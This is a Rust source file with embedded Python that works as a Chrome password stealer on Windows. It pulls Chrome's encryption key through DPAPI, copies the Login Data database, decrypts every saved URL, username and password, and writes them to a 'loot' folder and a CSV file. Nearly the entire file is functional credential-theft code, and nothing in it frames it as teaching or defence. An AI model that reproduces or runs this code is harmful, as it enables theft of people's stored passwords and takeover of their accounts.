use inline_python::python;
use std::env;
use std::fs;


pub fn run() {
    let dir = env::var("userprofile").unwrap_or("none".to_string());
    fs::create_dir_all(format!("{}\\Desktop\\loot\\passws\\", dir));
    python! {
        import os
        import re
        import sys
        import json
        import base64
        import sqlite3
        import win32crypt
        from Cryptodome.Cipher import AES
        import shutil
        import csv
        
        OUT_DIR=str(os.environ["USERPROFILE"]+"\\Desktop\\loot\\passws\\")
        OUT_FILE=str(OUT_DIR+"chrome.txt")

        #GLOBAL CONSTANT
        CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"%(os.environ["USERPROFILE"]))
        CHROME_PATH = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data"%(os.environ["USERPROFILE"]))
        
        def get_secret_key():
            try:
                #(1) Get secretkey from chrome local state
                with open( CHROME_PATH_LOCAL_STATE, "r", encoding="utf-8") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                #Remove suffix DPAPI
                secret_key = secret_key[5:] 
                secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
                return secret_key
            except Exception as e:
                print("%s"%str(e))
                print("[ERR] Chrome secretkey cannot be found")
                return None

        def decrypt_payload(cipher, payload):
            return cipher.decrypt(payload)

        def generate_cipher(aes_key, iv):
            return AES.new(aes_key, AES.MODE_GCM, iv)

        def decrypt_password(ciphertext, secret_key):
            try:
                #(3-a) Initialisation vector for AES decryption
                initialisation_vector = ciphertext[3:15]
                #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
                #Encrypted password is 192 bits
                encrypted_password = ciphertext[15:-16]
                #(4) Build the cipher to decrypt the ciphertext
                cipher = generate_cipher(secret_key, initialisation_vector)
                decrypted_pass = decrypt_payload(cipher, encrypted_password)
                decrypted_pass = decrypted_pass.decode()  
                return decrypted_pass
            except Exception as e:
                print("%s"%str(e))
                print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
                return ""

        def get_db_connection(chrome_path_login_db):
            try:
                shutil.copy2(chrome_path_login_db, "Loginvault.db") 
                return sqlite3.connect("Loginvault.db")
            except Exception as e:
                print("%s"%str(e))
                print("[ERR] Chrome database cannot be found")
                return None

        if __name__ == "__main__":
            try:
                #Create Dataframe to store passwords
                with open("decrypted_password.csv", mode="w", newline="", encoding="utf-8") as decrypt_password_file:
                    csv_writer = csv.writer(decrypt_password_file, delimiter=',')
                    csv_writer.writerow(["index","url","username","password"])
                    #(1) Get secret key
                    secret_key = get_secret_key()
                    #Search user profile or default folder (this is where the encrypted login password is stored)
                    folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
                    for folder in folders:
                        #(2) Get ciphertext from sqlite database
                        chrome_path_login_db = os.path.normpath(r"%s\\%s\\Login Data"%(CHROME_PATH,folder))
                        conn = get_db_connection(chrome_path_login_db)
                        if(secret_key and conn):
                            cursor = conn.cursor()
                            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                            with open(OUT_FILE, "a") as file:
                                file.write("\n\n----- Decrypted Chrome Passwords -----\n\n")
                                for index,login in enumerate(cursor.fetchall()):
                                    url = login[0]
                                    username = login[1]
                                    ciphertext = login[2]
                                    if(url!="" and username!="" and ciphertext!=""):
                                        decrypted_password = decrypt_password(ciphertext, secret_key)
                                        file.write("\nSequence: %d"%(index))
                                        file.write("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                                        file.write("*"*50)
                                        csv_writer.writerow([index,url,username,decrypted_password])
                                cursor.close()
                                conn.close()
                                os.remove("Loginvault.db")
                            file.close()
            except Exception as e:
                print("[ERR] "+str(e))
            }
}